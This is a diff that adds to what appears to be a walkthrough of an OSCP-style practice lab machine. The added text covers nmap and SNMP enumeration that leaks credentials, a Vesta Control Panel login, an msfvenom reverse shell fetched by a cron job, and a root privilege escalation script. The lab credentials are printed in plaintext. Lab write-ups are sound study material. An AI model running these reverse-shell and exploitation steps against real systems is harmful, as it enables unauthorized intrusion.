@@ -130,14 +130,151 @@ Host script results:
 ```
 {% endcode %}
 
+I don't usually include the UDP output but it is relevant this time:
 
+```
+Nmap scan report for frankfurt.oscp.exam (192.168.202.156)
+Host is up (0.053s latency).
+Not shown: 248 closed udp ports (port-unreach)
+PORT    STATE SERVICE VERSION
+53/udp  open  domain  ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 93840921de106a6300000000
+|   snmpEngineBoots: 15
+|_  snmpEngineTime: 2h09m28s
+| snmp-interfaces: 
+|   lo
+|     IP address: 127.0.0.1  Netmask: 255.0.0.0
+|     Type: softwareLoopback  Speed: 10 Mbps
+|     Traffic stats: 452.44 Kb sent, 452.44 Kb received
+|   VMware VMXNET3 Ethernet Controller
+|     IP address: 192.168.202.156  Netmask: 255.255.255.0
+|     MAC address: 00:50:56:bf:e7:12 (VMware)
+|     Type: ethernetCsmacd  Speed: 4 Gbps
+|_    Traffic stats: 4.08 Mb sent, 5.12 Mb received
+| snmp-processes: 
+|     ...
+| snmp-netstat: 
+|   TCP  0.0.0.0:21           0.0.0.0:0
+|   TCP  0.0.0.0:22           0.0.0.0:0
+|   TCP  0.0.0.0:25           0.0.0.0:0
+|   TCP  0.0.0.0:110          0.0.0.0:0
+|   TCP  0.0.0.0:143          0.0.0.0:0
+|   TCP  0.0.0.0:465          0.0.0.0:0
+|   TCP  0.0.0.0:587          0.0.0.0:0
+|   TCP  0.0.0.0:993          0.0.0.0:0
+|   TCP  0.0.0.0:995          0.0.0.0:0
+|   TCP  0.0.0.0:2525         0.0.0.0:0
+|   TCP  0.0.0.0:8083         0.0.0.0:0
+|   TCP  127.0.0.1:53         0.0.0.0:0
+|   TCP  127.0.0.1:783        0.0.0.0:0
+|   TCP  127.0.0.1:953        0.0.0.0:0
+|   TCP  127.0.0.1:8081       0.0.0.0:0
+|   TCP  127.0.0.1:8084       0.0.0.0:0
+|   TCP  127.0.0.53:53        0.0.0.0:0
+|   TCP  192.168.202.156:53   0.0.0.0:0
+|   TCP  192.168.202.156:80   0.0.0.0:0
+|   TCP  192.168.202.156:8080 0.0.0.0:0
+|   TCP  192.168.202.156:8443 0.0.0.0:0
+|   TCP  192.168.202.156:53996 142.132.212.2:443
+|   UDP  0.0.0.0:161          *:*
+|   UDP  0.0.0.0:33480        *:*
+|   UDP  127.0.0.1:53         *:*
+|   UDP  127.0.0.53:53        *:*
+|_  UDP  192.168.202.156:53   *:*
+| snmp-sysdescr: Linux oscp.exam 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+|_  System uptime: 2h09m28.41s (776841 timeticks)
+|_snmp-win32-software: ERROR: Script execution failed (use -d to debug)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.18
+OS details: Linux 2.6.18, Linux 2.6.30
+Network Distance: 4 hops
+Service Info: Host: oscp.exam; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+### Port 8083
+
+The landing page on port 8083 seems to be a login for the [Vesta Control Panel](https://vestacp.com/):
+
+<figure><img src="../../../.gitbook/assets/SL-FF-E-8083_Landing.png" alt=""><figcaption></figcaption></figure>
+
+I try some basic logins but have no success.
+
+### SNMP
+
+I dump the SNMP contents into a file:
+
+```bash
+snmpwalk -v2c -c public frankfurt.oscp.exam > v2c.snmp &
+```
+
+This takes forever and returns a ton of useless output. As I am looking around I remember [this trick](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp) from HackTricks:
+
+{% code overflow="wrap" %}
+```bash
+snmpwalk -v2c -c public 192.168.180.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull > full.snmp &
+```
+{% endcode %}
+
+This time I find something useful (output is actually much smaller than expected so I just reran and captured it on screen):
+
+<figure><img src="../../../.gitbook/assets/SL-FF-E-SnmpExtendedOutput.png" alt=""><figcaption><p>Credentials in SNMP</p></figcaption></figure>
+
+When I try to validate the credentials they seem invalid at first blush but I eventually try them with the username capitalized and it works (screenshot shows `lftp` commands run back-to-back to highlight differences):
+
+<figure><img src="../../../.gitbook/assets/SL-FF-F-JackCaseSensitive.png" alt=""><figcaption><p>Credentials are case sensitive</p></figcaption></figure>
+
+After some poking I find that the credentials Jack:3PUKsX98BMupBiCf work on FTP and the Vesta Control Panel on port 8083:
+
+<figure><img src="../../../.gitbook/assets/SL-FF-F-JackVestaCpLogin.png" alt=""><figcaption><p>Successful login at port 8083</p></figcaption></figure>
 
 ## Foothold
 
+After some research I find an authenticated RCE for Vesta Control Panel. The [first one I find](https://www.exploit-db.com/exploits/48294) is a Metasploit module but it does not work.
 
+### Manual Exploitation
+
+Eventually I find [this writeup](https://gitlab.com/-/snippets/1954764) which contains manual exploitation techniques. This works flawlessly. I generate a reverse shell with `msfvenom`:
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=25 -f elf -o rs
+```
+{% endcode %}
+
+I then create a CRON job to download and run the shell as seen in the writeup:
+
+<figure><img src="../../../.gitbook/assets/SL-FF-F-ManualCron.png" alt=""><figcaption><p>Manual cron job to download and run shell</p></figcaption></figure>
+
+I launch a listener and wait a minute. I can see the download request in my Apache logs and then I catch the shell:
+
+```bash
+nc -lvnp 25
+```
+
+<figure><img src="../../../.gitbook/assets/SL-FF-F-ManualCron_Shell.png" alt=""><figcaption><p>Shell caught</p></figcaption></figure>
+
+User access achieved as `Jack`.
 
 ## Privilege Escalation
 
+### Vesta Control Panel
 
+Eventually I find [this writeup](https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/) which explains a privilege escalation vector and has some exploit code. I just copy the code files and run the exploit command:
 
-There is no post-exploit required for standalone exam machines.
+```bash
+python vestaROOT.py https://frankfurt.oscp.exam:8083 Jack 3PUKsX98BMupBiCf
+```
+
+This launches a shell as `root`:
+
+<figure><img src="../../../.gitbook/assets/SL-FF-PE-RootShell.png" alt=""><figcaption><p>Root shell</p></figcaption></figure>
+
+`root` access achieved. There is no post-exploit required for standalone exam machines.
